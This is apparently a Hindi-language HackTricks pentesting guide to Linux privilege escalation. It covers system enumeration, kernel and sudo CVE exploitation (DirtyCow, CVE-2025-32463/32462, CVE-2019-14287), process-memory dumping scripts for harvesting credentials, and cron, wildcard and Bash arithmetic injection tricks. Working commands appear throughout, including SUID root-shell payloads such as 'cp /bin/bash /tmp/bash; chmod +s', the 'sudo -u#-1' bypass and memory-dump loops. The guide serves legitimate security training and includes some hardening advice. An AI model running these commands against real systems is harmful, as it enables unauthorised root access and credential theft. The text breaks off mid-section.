# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

व्यापक पृष्ठभूमि और ऐतिहासिक enumeration workflows के लिए, references में दिए गए g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation और linux-private-i resources देखें।<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## सिस्टम की जानकारी

### OS की जानकारी

आइए, चल रहे OS के बारे में कुछ जानकारी जुटाना शुरू करें।

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

यदि आपके पास PATH variable में शामिल किसी भी फ़ोल्डर पर लिखने की अनुमति है, तो आप कुछ libraries या binaries को hijack कर सकते हैं:

```bash
echo $PATH
```

### Env जानकारी

क्या environment variables में दिलचस्प जानकारी, पासवर्ड या API keys हैं?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Kernel version जाँचें और देखें कि क्या privileges escalate करने के लिए कोई exploit इस्तेमाल किया जा सकता है।

[Kernel/LPE/CVE section](../../main-system-information/kernel-lpe-cves/README.md) में local escalation के cases और Binary Exploitation में Linux kernel पर गहराई से लिखे गए लेखों के links दिए गए हैं। किसी case study को test करने से पहले प्रभावित build और configuration verify करें।

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

आपको यहाँ vulnerable kernel की एक अच्छी सूची और कुछ पहले से **compiled exploits** मिल सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)।<sup>[[12]](#references)</sup>\
कुछ अन्य साइटें जहाँ आपको **compiled exploits** मिल सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी vulnerable kernel versions निकालने के लिए आप यह कर सकते हैं:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

kernel exploits खोजने में मदद कर सकने वाले tools हैं:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim पर execute करें, यह केवल kernel 2.x के exploits की जाँच करता है)

हमेशा **Google पर kernel version खोजें**। हो सकता है कि आपका kernel version किसी kernel exploit में लिखा हो, जिससे आप सुनिश्चित हो सकेंगे कि यह exploit valid है।

अतिरिक्त kernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux में privilege escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo संस्करण

इनमें उल्लिखित vulnerable sudo versions के आधार पर:

```bash
searchsploit sudo
```

आप grep का उपयोग करके जाँच सकते हैं कि sudo का version असुरक्षित है या नहीं।

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 से 1.9.17** तक में, unprivileged local users `--chroot` option के ज़रिए root तक privilege escalate कर सकते हैं, जब sudo `/etc/nsswitch.conf` को user-controlled directory से load करता है; upstream ने इसे **1.9.17p1** में ठीक किया। संबंधित paths में मौजूद हर executable root-setuid sudo binary जाँचें, क्योंकि `sudo -V` केवल `PATH` से चुनी गई binary की जानकारी देता है। Distribution packages upstream version string बदले बिना भी fix को backport कर सकते हैं, इसलिए vendor package status भी verify करें। [sudo maintainer की advisory](https://www.openwall.com/lists/oss-security/2025/06/30/3) देखें।<sup>[[28]](#references)[[29]](#references)</sup>

इस [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) का exploit करने के लिए यह [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) है। Exploit चलाने से पहले सुनिश्चित करें कि आपका `sudo` version vulnerable है और उसमें `chroot` feature उपलब्ध है।  

अधिक जानकारी के लिए मूल [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) देखें।<sup>[[28]](#references)</sup>

### Sudo host-based rules bypass (CVE-2025-32462)

Upstream sudo **1.8.8 से 1.9.17** तक, host-based sudoers rules का मूल्यांकन `sudo -h <host>` से दिए गए **user-supplied hostname** के आधार पर कर सकता है, न कि **real hostname** के आधार पर; upstream ने इसे **1.9.17p1** में ठीक किया। चुने गए host पर user के पास अब भी मेल खाती sudoers entry होनी चाहिए। Vendor backports और alternate sudo binaries के साथ-साथ local policy भी जाँचें। [sudo maintainer की advisory](https://www.openwall.com/lists/oss-security/2025/06/30/2) देखें।<sup>[[29]](#references)</sup>

Requirements:
- Vulnerable sudo version
- Host-specific sudoers rules (host न तो current hostname हो और न ही `ALL`)

Example sudoers pattern:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

अनुमत host को spoof करके exploit करें:

```bash
sudo -h devbox id
sudo -h devbox -i
```

यदि चुने गए नाम का resolution विफल हो, तो सत्यापित करें कि वह नाम host पर कैसे resolve होता है। किसी log या configuration file में नाम दिखने भर से वह resolvable नहीं हो जाता, और `/etc/hosts` को बदलने के लिए आम तौर पर privileged write access की आवश्यकता होती है।

#### sudo < v1.8.28

इस [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) के लिए एक प्रभावी sudo rule आवश्यक है, जो `ALL` users के रूप में command चलाने की अनुमति देता हो, लेकिन root को बाहर रखता हो, जैसे `(ALL, !root) /bin/bash`। Caller को authentication की किसी भी आवश्यकता सहित, उस rule का उपयोग करने की अनुमति भी होनी चाहिए। Installed package की advisory जाँचें: vendors ने उन releases में fix backport किया था, जिनका प्रदर्शित upstream version अब भी 1.8.28 से कम है। केवल `!root` rule या पुराना version exposure की पुष्टि नहीं करता। Passive enumeration के दौरान कोई privileged command test न करें।

```
sudo -u#-1 /bin/bash
```

### Dmesg signature verification failed

इस vuln का exploit कैसे किया जा सकता है, इसका **example** देखने के लिए **HTB का smasher2 box** देखें.

```bash
dmesg 2>/dev/null | grep "signature"
```

### अधिक system enumeration

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## संभावित बचावों की सूची बनाएं

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

अगर आप किसी container के अंदर हैं, तो container-security सेक्शन से शुरुआत करें और फिर runtime-specific abuse पेजों पर जाएँ:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## ड्राइव

जाँचें कि **क्या mount और unmount है**, कहाँ और क्यों। अगर कुछ unmount है, तो आप उसे mount करके निजी जानकारी खोजने की कोशिश कर सकते हैं.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## उपयोगी सॉफ़्टवेयर

उपयोगी बाइनरीज़ की सूची बनाएँ

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

यह भी जाँचें कि **कोई compiler इंस्टॉल है या नहीं**। यह उपयोगी है, अगर आपको किसी kernel exploit का उपयोग करना हो, क्योंकि इसे उस मशीन पर compile करने की सलाह दी जाती है जहाँ आप इसका उपयोग करने वाले हैं (या किसी समान मशीन पर)।

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### इंस्टॉल किया गया असुरक्षित सॉफ़्टवेयर

**इंस्टॉल किए गए पैकेज और सेवाओं के वर्शन** की जाँच करें। हो सकता है कि Nagios का कोई पुराना वर्शन (उदाहरण के लिए) हो, जिसका फायदा उठाकर privilege escalation किया जा सके…\
ज़्यादा संदिग्ध इंस्टॉल किए गए सॉफ़्टवेयर के वर्शन की मैन्युअल रूप से जाँच करने की सलाह दी जाती है।

```bash
dpkg -l #Debian
rpm -qa #Centos
```

यदि आपके पास मशीन का SSH access है, तो मशीन के अंदर इंस्टॉल किए गए पुराने और vulnerable software की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये commands बहुत सारी जानकारी दिखाएँगी, जिसमें से ज़्यादातर बेकार होगी। इसलिए OpenVAS या इसी तरह के कुछ applications का उपयोग करने की सलाह दी जाती है, जो जाँचेंगे कि इंस्टॉल किए गए किसी software version में known exploits के लिए vulnerability है या नहीं_

## Processes

देखें कि **कौन-से processes** चलाए जा रहे हैं और जाँचें कि क्या किसी process के पास **ज़रूरत से ज़्यादा privileges** हैं (शायद tomcat को root द्वारा चलाया जा रहा हो?)

```bash
ps aux
ps -ef
top -n 1
```

हमेशा जाँचें कि कहीं [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) चल तो नहीं रहे; privileges escalate करने के लिए आप उनका दुरुपयोग कर सकते हैं। **Linpeas** process की command line में `--inspect` parameter जाँचकर उनका पता लगाता है।\
यह भी **जाँचें कि processes की binaries पर आपके क्या privileges हैं**—हो सकता है आप किसी की binary overwrite कर सकें।

### अलग-अलग users के बीच parent-child chains

किसी child process का अपने parent से **अलग user** के तहत चलना अपने-आप में malicious नहीं है, लेकिन यह **triage signal** के तौर पर उपयोगी है। कुछ transitions अपेक्षित होते हैं (`root` का service user को spawn करना, login managers का session processes बनाना), लेकिन असामान्य chains wrappers, debug helpers, persistence या runtime trust boundaries की कमज़ोरियों का पता लगा सकती हैं।

त्वरित समीक्षा:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

अगर आपको कोई अप्रत्याशित chain मिले, तो parent command line और उसके व्यवहार को प्रभावित करने वाली सभी files (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments) की जाँच करें। कई वास्तविक privesc paths में child खुद writable नहीं था, लेकिन **parent-controlled config** या helper chain writable थी।

### हटाए गए executables और हटाई गईं खुली files

Runtime artifacts अक्सर **हटाए जाने के बाद भी** उपलब्ध रहते हैं। यह privilege escalation और उन processes से evidence पुनर्प्राप्त करने, दोनों के लिए उपयोगी है जिनके पास पहले से sensitive files खुली हैं।

हटाए गए executables की जाँच करें:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

यदि `/proc/<PID>/exe` `(deleted)` की ओर इंगित करता है, तो process अभी भी memory से पुरानी binary image चला रहा है। यह जांच करने का एक मज़बूत संकेत है, क्योंकि:

- हटाए गए executable में दिलचस्प strings या credentials हो सकते हैं
- चल रहा process अभी भी उपयोगी file descriptors उपलब्ध करा सकता है
- हटाई गई privileged binary हालिया छेड़छाड़ या सफ़ाई के प्रयास का संकेत हो सकती है

सभी deleted-open files इकट्ठा करें:

```bash
lsof +L1
```

यदि आपको कोई रोचक descriptor मिले, तो उसे सीधे पुनर्प्राप्त करें:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

यह खास तौर पर तब उपयोगी है, जब किसी process में अब भी कोई deleted secret, script, database export या flag file खुली हो।

### Process monitoring

Processes की निगरानी के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग कर सकते हैं। बार-बार चलने वाले vulnerable processes या आवश्यकताओं का कोई सेट पूरा होने पर चलने वाले processes की पहचान करने में यह बहुत उपयोगी हो सकता है।

#### sudo के तहत Linux ProcMon

[Linux के लिए ProcMon](https://github.com/microsoft/ProcMon-for-Linux) चुने हुए processes और system calls को trace कर सकता है और SQLite trace सेव कर सकता है। अगर `sudo -l` बिना किसी प्रतिबंध के root-capable `procmon` command चलाने की अनुमति देता है, तो विचार करें कि क्या यह किसी दूसरे user के process के input या output को देख सकता है। यह permission सिर्फ़ जाँच के लिए एक सुराग है: tracer support, प्रभावी policy और किसी उपयुक्त process की गतिविधि—ये सभी मायने रखते हैं। Trace files में secrets हो सकते हैं, इसलिए अधिकृत exports की सावधानी से जाँच करें और असंबंधित processes का data इकट्ठा करने से बचें।

### Process memory

Server की कुछ services **credentials को memory के अंदर clear text में सेव करती हैं**।\
आमतौर पर, दूसरे users के processes की memory पढ़ने के लिए आपको **root privileges** की ज़रूरत होगी। इसलिए यह आम तौर पर तब ज़्यादा उपयोगी है, जब आप पहले से root हों और अधिक credentials ढूँढ़ना चाहते हों।\
हालाँकि, ध्यान रखें कि **एक regular user के रूप में आप अपने स्वामित्व वाले processes की memory पढ़ सकते हैं**।

> [!WARNING]
> ध्यान दें कि आजकल ज़्यादातर machines **डिफ़ॉल्ट रूप से ptrace की अनुमति नहीं देतीं**, यानी आप अपने unprivileged user के दूसरे processes का dump नहीं निकाल सकते।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की पहुँच को नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, बशर्ते उनका uid समान हो। ptracing के काम करने का यह पारंपरिक तरीका है।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability आवश्यक है।
> - **kernel.yama.ptrace_scope = 3**: ptrace से किसी भी process को trace नहीं किया जा सकता। इसे सेट करने के बाद, ptracing फिर से सक्षम करने के लिए reboot करना होगा।

एक ही UID वाला process, जो कुछ समय के लिए password vault को unlock करता है, credentials की एक अलग सीमा हो सकता है। जब tracing की अनुमति हो, तो कोई सक्रिय, dumpable process अपने input syscalls या memory के ज़रिए vault password उजागर कर सकता है, भले ही encrypted vault file सुरक्षित रहे। `ptrace_scope=0` सिर्फ़ एक पूर्वशर्त है: समान credentials, target का dumpability, दूसरे Linux security modules और process का जीवनकाल भी मायने रखते हैं। Vault की किसी entry को Unix root login के रूप में इस्तेमाल करने के लिए credentials के दोबारा उपयोग की अलग से जाँच करनी होगी। नियमित enumeration में secrets कैप्चर करने या दिखाने के बजाय policy और संभावित process या vault paths की रिपोर्ट करें। [kernel के Yama documentation](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) और [ptrace access checks](https://man7.org/linux/man-pages/man2/ptrace.2.html) देखें।

#### GDB

अगर आपको किसी FTP service की memory तक पहुँच है (उदाहरण के लिए), तो आप उसका Heap प्राप्त करके उसमें credentials खोज सकते हैं।

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB स्क्रिप्ट

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps दिखाता है कि उस process के virtual address space में memory कैसे map की गई है**; यह **हर mapped region की permissions** भी दिखाता है। **mem** pseudo file **खुद process की memory को उजागर करती है**। **maps** file से हमें पता चलता है कि कौन-से **memory regions readable हैं** और उनके offsets क्या हैं। इस जानकारी का उपयोग करके हम **mem file में seek करते हैं और सभी readable regions को एक file में dump करते हैं**।

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच देता है, वर्चुअल मेमोरी तक नहीं। Kernel का virtual address space /dev/kmem का उपयोग करके एक्सेस किया जा सकता है।\
आमतौर पर, `/dev/mem` केवल **root** और **kmem** group के लिए पढ़ने योग्य होता है।

```
strings /dev/mem -n10 | grep -i PASS
```

### Linux के लिए ProcDump

ProcDump, Windows के Sysinternals टूल्स के क्लासिक ProcDump टूल का Linux संस्करण है। इसे [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) से प्राप्त करें।

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### टूल्स

किसी process की memory dump करने के लिए आप ये इस्तेमाल कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप root की आवश्यकता को manually हटा सकते हैं और अपने स्वामित्व वाले process को dump कर सकते हैं
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) से Script A.5 (root आवश्यक है)

### Process Memory से Credentials

#### Manual उदाहरण

अगर आपको पता चले कि authenticator process चल रहा है:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

आप process को dump कर सकते हैं (process की memory dump करने के अलग-अलग तरीके जानने के लिए पिछले sections देखें) और memory में credentials खोज सकते हैं:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **मेमोरी** और कुछ **प्रसिद्ध फ़ाइलों** से clear text credentials **चुरा लेगा**। इसे सही ढंग से काम करने के लिए root privileges की आवश्यकता होती है।

| फ़ीचर                                            | प्रक्रिया का नाम     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (सक्रिय FTP कनेक्शन)                       | vsftpd               |
| Apache2 (सक्रिय HTTP Basic Auth सेशन)             | apache2              |
| OpenSSH (सक्रिय SSH सेशन - Sudo का उपयोग)         | sshd:                |

#### Regexes की खोज/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## शेड्यूल किए गए/Cron जॉब

### Crontab UI (alseambusher) root के रूप में चल रहा है – वेब-आधारित scheduler privesc

अगर कोई वेब “Crontab UI” पैनल (alseambusher/crontab-ui) root के रूप में चलता है और केवल loopback से जुड़ा है, तब भी SSH local port-forwarding के ज़रिए उस तक पहुँचा जा सकता है और privilege escalation के लिए एक privileged job बनाया जा सकता है।<sup>[[1]](#references)[[4]](#references)</sup>

सामान्य क्रम
- loopback-only port (जैसे, 127.0.0.1:8000) और Basic-Auth realm का पता लगाएँ: `ss -ntlp` / `curl -v localhost:8000`
- operational artifacts में credentials खोजें:
  - `zip -P <password>` वाले backups/scripts
  - `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` दिखाने वाली systemd unit
- Tunnel बनाएँ और लॉगिन करें:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएँ और तुरंत चलाएँ (SUID shell बनाता है):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसका उपयोग करें:
```bash
/tmp/rootshell -p   # root shell
```

सुरक्षा मज़बूत करना
- Crontab UI को root के रूप में न चलाएँ; इसके लिए एक समर्पित user और न्यूनतम permissions का उपयोग करें
- localhost से bind करें और firewall/VPN के ज़रिए access को भी प्रतिबंधित करें; passwords दोबारा इस्तेमाल न करें
- unit files में secrets एम्बेड करने से बचें; secret stores या केवल root द्वारा पढ़ी जा सकने वाली EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें

जाँचें कि कोई scheduled job vulnerable तो नहीं है। शायद आप root द्वारा execute की जाने वाली किसी script का फ़ायदा उठा सकें (wildcard vuln? क्या आप उन files को modify कर सकते हैं जिनका उपयोग root करता है? symlinks का उपयोग करें? उस directory में कोई ख़ास files बनाएँ जिसका उपयोग root करता है?)

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

यदि `run-parts` का उपयोग किया जाता है, तो जाँचें कि वास्तव में कौन-से नाम निष्पादित होंगे:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

इससे false positives से बचा जा सकता है। Writable periodic directory तभी उपयोगी होती है, जब आपके payload filename का नाम स्थानीय `run-parts` नियमों से मेल खाता हो।

### Cron path

उदाहरण के लिए, _/etc/crontab_ में आपको PATH मिल सकता है: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि user "user" के पास /home/user पर write करने के privileges हैं_)

अगर इस crontab में root user path सेट किए बिना कोई command या script चलाने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तो, आप इसका उपयोग करके root shell पा सकते हैं:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Wildcard के साथ script का उपयोग करने वाला Cron (Wildcard Injection)

यदि root द्वारा चलाए जाने वाले script में किसी command के अंदर “**\***” हो, तो आप इसका फ़ायदा उठाकर अप्रत्याशित काम करवा सकते हैं (जैसे privesc)। उदाहरण:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**अगर wildcard से पहले कोई path हो, जैसे** _**/some/path/\***_ **, तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)।**

wildcard exploitation की अन्य tricks के लिए यह पेज पढ़ें:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron log parsers में Bash arithmetic expansion injection

Bash arithmetic untrusted text को expression के रूप में समझ सकता है। प्रभावित Bash contexts में, उस expression के अंदर array subscript किसी command substitution को evaluate कर सकता है। अगर कोई privileged cron/parser attacker-controlled log text को ऐसी arithmetic comparison में डालता है, तो substitution parser की identity के साथ चल सकता है।<sup>[[22]](#references)</sup> यह सटीक Bash expression और version पर निर्भर करता है; expanded variable में अकेली `$(...)0` string, अपने आप में, दोबारा evaluation का भरोसेमंद उदाहरण नहीं है।

Input file metadata या user-writable location से पढ़े गए किसी अन्य field से भी आ सकता है। उदाहरण के लिए, कोई privileged cleanup script अगर image का `Producer` tag पढ़कर उसकी तुलना `[[ "$producer" -eq "expected" ]]` से करता है, तो वह arithmetic comparison करता है, भले ही variable quoted हो। Scheduled identity, वे files जो tag दे सकती हैं, comparison से पहले होने वाले transformations, और Bash का सटीक behavior जाँचें। Text labels के लिए string comparison इस्तेमाल करें; numbers के लिए arithmetic से पहले input को decimal digits के रूप में validate करें। [Bash arithmetic rules](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html) देखें।

- आम vulnerable pattern:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- array-subscript mechanism के लिए सुरक्षित स्थानीय व्यवहार जांच (कोई privileged process या फ़ाइल परिवर्तन नहीं):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

वास्तव में scheduled script और उसके द्वारा खोले जाने वाले literal input path का पता लगाएँ। Log file स्वयं writable न होने पर भी, उसका non-sticky parent लिखने और traverse करने की अनुमति रखने वाला user उसकी directory entry को बदल सकता है; `namei -l` इन permissions में अंतर समझने में मदद करता है। कोई अलग writable log path, unreadable scheduler, या ऐसा parser जो उस field को Bash arithmetic के रूप में evaluate ही नहीं करता, इस path को स्थापित नहीं करता।

### Cron script को overwrite करना और symlink

अगर आप root द्वारा execute की जाने वाली **cron script को modify कर सकते हैं**, तो आप बहुत आसानी से shell प्राप्त कर सकते हैं:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

यदि root द्वारा निष्पादित script किसी **ऐसी directory का उपयोग करती है जिस पर आपका पूरा access है**, तो उस folder को delete करके **किसी दूसरी directory की ओर संकेत करने वाला symlink folder बनाना** उपयोगी हो सकता है, जहाँ आपकी नियंत्रित script मौजूद हो.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Symlink की जाँच और फ़ाइलों को अधिक सुरक्षित ढंग से संभालना

विशेषाधिकार प्राप्त scripts/binaries की समीक्षा करते समय, जो path के ज़रिए फ़ाइलें पढ़ती या लिखती हैं, जाँचें कि links को कैसे संभाला जाता है:

- `stat()` symlink को follow करता है और target का metadata लौटाता है।
- `lstat()` link का metadata लौटाता है।
- `readlink -f` और `namei -l` अंतिम target का पता लगाने और path के हर component की permissions दिखाने में मदद करते हैं।

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

डिफेंडर्स/डेवलपर्स के लिए, symlink tricks से बचाव के अधिक सुरक्षित तरीके:

- `O_EXCL` के साथ `O_CREAT`: अगर path पहले से मौजूद है तो विफल हो जाए (हमलावर द्वारा पहले से बनाए गए links/files को रोकता है)।
- `openat()`: किसी विश्वसनीय directory file descriptor के सापेक्ष काम करें।
- `mkstemp()`: सुरक्षित permissions के साथ temporary files को atomically बनाएँ।

### writable payloads वाले custom-signed cron binaries

अगर कोई सामान्य user उस exact binary में लिख सकता है जिसे root cron job चलाता है, तो वह privilege boundary पार कर सकता है; लेकिन custom signature check unsigned replacement को अस्वीकार कर सकता है। दस्तावेज़ में दिए गए मामले में, root-owned ELF का mode `0760` था, जिससे उसके group का सदस्य उसमें लिख सकता था और root owner उसे execute कर सकता था। एक दिखाई देने वाले process trace से पता चला कि job के binary चलाने से पहले `objcopy` `.text_sig` को extract कर रहा था; पूरी verifier script पढ़ने योग्य नहीं थी।<sup>[[2]](#references)</sup>

